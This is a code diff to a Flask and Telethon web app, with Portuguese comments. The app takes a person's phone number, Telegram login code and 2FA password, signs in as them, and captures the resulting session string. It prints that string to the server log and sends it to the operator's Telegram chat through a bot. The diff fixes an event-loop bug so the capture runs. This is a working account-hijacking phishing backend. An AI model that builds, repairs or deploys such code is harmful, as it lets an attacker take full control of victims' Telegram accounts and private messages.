@@ -5,6 +5,7 @@ from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 import requests
 import os
+import asyncio
 
 app = Flask(__name__, static_folder='static')
 CORS(app)
@@ -22,8 +23,8 @@ clients = {}
 
 @app.route('/')
 def index():
-    # AQUI ESTÁ A CORREÇÃO: Puxa o HTML da pasta static
     return send_from_directory('static', 'index.html')
+
 @app.route('/request_code', methods=['POST'])
 def request_code():
     data = request.json
@@ -31,16 +32,20 @@ def request_code():
     if not phone:
         return jsonify({"success": False, "error": "Telefone invalido"}), 400
 
-    client = TelegramClient(StringSession(), API_ID, API_HASH)
-    client.connect()
     try:
+        # A CORREÇÃO: Força a criação de um novo loop de eventos para o Telethon
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
+        client.connect()
+        
         sent_code = client.send_code_request(phone)
         clients[phone] = {'client': client, 'phone_code_hash': sent_code.phone_code_hash}
         return jsonify({"success": True}), 200
     except Exception as e:
-        # AQUI ELE VAI CUSPIR O ERRO NA TELA PRA NÓS VERMOS
-        print(f"ERRO NO TELEGRAM: {str(e)}") 
-        return jsonify({"success": False, "error": f"Bloqueio do Telegram: {str(e)}"}), 500
+        print(f"ERRO NO TELEGRAM (request_code): {str(e)}")
+        return jsonify({"success": False, "error": str(e)}), 500
 
 @app.route('/verify_code', methods=['POST'])
 def verify_code():
@@ -58,10 +63,8 @@ def verify_code():
         client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
         session_string = client.session.save()
         
-        # IMPRIME NO LOG DO RENDER (GARANTIA DE CAPTURA)
         print(f"\n\n========= STRING CAPTURADA =========\n{phone}\n{session_string}\n====================================\n\n")
         
-        # MANDA PRO TELEGRAM
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         payload = {"chat_id": YOUR_TELEGRAM_ID, "text": f"String:\n`{session_string}`", "parse_mode": "Markdown"}
         requests.post(url, data=payload, timeout=10)
@@ -72,6 +75,7 @@ def verify_code():
     except SessionPasswordNeededError:
         return jsonify({"success": False, "error": "2FA_REQUIRED"}), 200
     except Exception as e:
+        print(f"ERRO NO TELEGRAM (verify_code): {str(e)}")
         return jsonify({"success": False, "error": str(e)}), 500
 
 @app.route('/verify_2fa', methods=['POST'])
@@ -87,7 +91,6 @@ def verify_2fa():
         client.sign_in(password=password)
         session_string = client.session.save()
         
-        # IMPRIME NO LOG DO RENDER
         print(f"\n\n========= STRING CAPTURADA (2FA) =========\n{phone}\n{session_string}\n==========================================\n\n")
         
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
